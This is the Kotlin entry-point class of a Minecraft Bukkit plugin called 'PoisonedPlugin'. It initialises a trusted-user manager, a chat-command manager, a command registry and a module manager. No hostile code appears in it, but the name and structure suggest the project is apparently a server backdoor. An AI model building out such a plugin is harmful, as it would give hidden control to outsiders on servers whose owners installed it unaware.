package de.maxbossing.poisonedplugin

import de.maxbossing.poisonedplugin.command._CommandRegistry
import de.maxbossing.poisonedplugin.manager.ChatCommandManager
import de.maxbossing.poisonedplugin.manager.TrustedUserManager
import de.maxbossing.poisonedplugin.module.ModuleManager
import de.maxbossing.poisonedplugin.utils.log
import org.bukkit.plugin.java.JavaPlugin

class PoisonedPlugin: JavaPlugin() {

    companion object {
        lateinit var instance: PoisonedPlugin
        var debug = true
    }

    override fun onLoad() {
        instance = this

        TrustedUserManager
        log("TrustedUserManager loaded")
    }

    override fun onEnable() {
        ChatCommandManager; log("ChatCommandManager Loaded")

        _CommandRegistry; log("Independent Commands Loaded")

        ModuleManager; log("Dependent Modules Loaded")
    }
}

val instance by lazy { PoisonedPlugin.instance }